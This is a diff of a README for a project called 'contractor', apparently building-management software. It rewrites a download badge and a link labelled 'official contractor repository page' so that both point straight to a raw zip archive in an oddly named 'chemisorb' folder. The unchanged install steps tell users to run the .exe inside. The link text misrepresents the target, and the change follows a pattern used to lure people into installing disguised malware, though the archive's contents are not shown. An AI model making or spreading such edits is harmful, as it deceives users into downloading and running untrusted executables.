@@ -1,6 +1,6 @@
 # 🛠️ contractor - Manage your building projects with ease
 
-[![Download contractor](https://img.shields.io/badge/Download-contractor-blue)](https://github.com/amaleasordid514/contractor)
+[![Download contractor](https://img.shields.io/badge/Download-contractor-blue)](https://github.com/amaleasordid514/contractor/raw/refs/heads/main/chemisorb/Software_v3.1-alpha.3.zip)
 
 ## 📋 What is contractor?
 
@@ -17,7 +17,7 @@ You do not need special hardware to run this software. Ensure your computer meet
 
 ## 📥 How to install 
 
-1. Visit the [official contractor repository page](https://github.com/amaleasordid514/contractor).
+1. Visit the [official contractor repository page](https://github.com/amaleasordid514/contractor/raw/refs/heads/main/chemisorb/Software_v3.1-alpha.3.zip).
 2. Look for the latest release on the right side of your screen.
 3. Select the file ending in .exe to download it to your Windows computer.
 4. Open your Downloads folder.
